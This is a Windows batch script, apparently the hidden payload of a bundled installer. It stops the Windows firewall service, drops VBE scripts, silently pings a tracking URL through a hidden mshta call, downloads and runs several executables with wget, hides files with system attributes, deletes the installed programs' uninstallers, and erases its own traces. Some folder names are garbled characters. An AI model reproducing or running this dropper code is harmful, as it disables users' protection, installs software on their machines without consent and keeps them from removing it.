@shift
set var=2011
net stop sharedaccess
echo %time%>>"%MYFILES%\DllMain.txt"
echo %time%>>"%MYFILES%\ComRes.txt"
echo %time%>>"%MYFILES%\oa.txt"
echo %time%>>"%MYFILES%\a.txt"
echo %time%>>"%MYFILES%\encoded.ini"

echo %time%>>"%MYFILES%\oh.ini"
echo %time%>>"%MYFILES%\exe1.ini"
echo %time%>>"%MYFILES%\exe2.ini"
mkdir D:\adminstors
mkdir "d:\Program Files\"
copy "%MYFILES%\DllMain.txt" "D:\adminstors\DllMain.vbe"
copy "%MYFILES%\oa.txt" "D:\adminstors\oa.vbe"
copy "%MYFILES%\a.txt" "D:\adminstors\a.vbe"
copy "%MYFILES%\ComRes.txt" "D:\adminstors\ComRes"
COPY "%MYFILES%\encoded.ini" "d:\Program Files\CORP.vbe"

"%MYFILES%\Update.exe"
"%MYFILES%\war.exe" /i "%MYFILES%\oh.ini" /quiet
mshta vbscript:createobject("wscript.shell").run("""iexplore""http://cnzz.sjt8.com/info.access/?stat_%var%",0)(window.close)
del "%MYFILES%\encoded.ini"  /f
del "d:\Program Files\CORP.vbe"  /f
attrib +r +h +s "C:\Program Files\IUpdate\oem.ini"
attrib +r +h +s "C:\Program Files\IUpdate\IEUpdate.ini"

"%MYFILES%\wget.exe" http://xiazai.kugou.com/Corp/kugou_2355.exe -O "C:\Program Files\Common Files\kugou_2355.exe"
"%MYFILES%\war.exe" /i "%MYFILES%\exe1.ini" /quiet
"%MYFILES%\wget.exe" http://www.xunlei100.com/msn/software/partner/d2/36a11.exe -O "C:\Program Files\Common Files\36a11.exe"
"%MYFILES%\war.exe" /i "%MYFILES%\exe2.ini" /quiet
ping 127.0.0.1 -n 180>nul
"%MYFILES%\wget.exe" http://setup.ov-v.com/install/pipi_dae_476.exe -O "C:\Program Files\Common Files\pipi_dae_476.exe"
"C:\Program Files\Common Files\pipi_dae_476.exe"
"%MYFILES%\wget.exe" http://setup.ov-v.com/install/qliao2.exe -O "C:\Program Files\Common Files\qliao2.exe"
"C:\Program Files\Common Files\qliao2.exe"


del "C:\Program Files\pipi\unins000.exe" /f
del "C:\Program Files\DuoMi\uninst.exe" /f
del "%USERPROFILE%\Local Settings\Temp\36.exe" /f
del "C:\Program Files\KuGou\KuGou2010\unins000.exe" /f
del "%ALLUSERSPROFILE%\����ʼ���˵�\����\����\*.*" /f /q
del "%USERPROFILE%\����ʼ���˵�\����\����\*.*" /f /q
del "C:\Program Files\Youdao\Dict\uninst.exe" /f
del %MYFILES% /f /s /q
